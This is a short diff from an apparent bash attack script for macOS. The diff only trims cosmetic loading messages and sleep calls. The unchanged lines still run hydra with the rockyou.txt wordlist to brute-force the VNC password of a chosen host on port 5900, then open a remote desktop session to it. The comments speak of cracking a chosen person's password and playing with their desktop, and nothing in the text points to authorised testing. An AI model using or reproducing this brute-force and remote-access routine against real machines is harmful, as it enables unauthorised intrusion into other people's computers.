@@ -45,12 +45,7 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
 
             if [[ $service == 5900 ]] || [[ $service == "VNC" ]]; then #makes the user input "NONE" for them to crack prot 5900(VNC)
                 hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
-                echo "Loading VNC server." #tells the user that VNC(5900) is loading
-                sleep 1 # wait function 
-                echo "Loading VNC server.." #tells the user that VNC(5900) is loading
-                sleep 1 # wait function 
                 echo "Loading VNC server..." #tells the user that VNC(5900) is loading
-                sleep 1 # wait function 
                 open vnc://$host #allows the user to remotly connect to the users Desktop to play with there desktop
                 exit; # stops the porgram
 
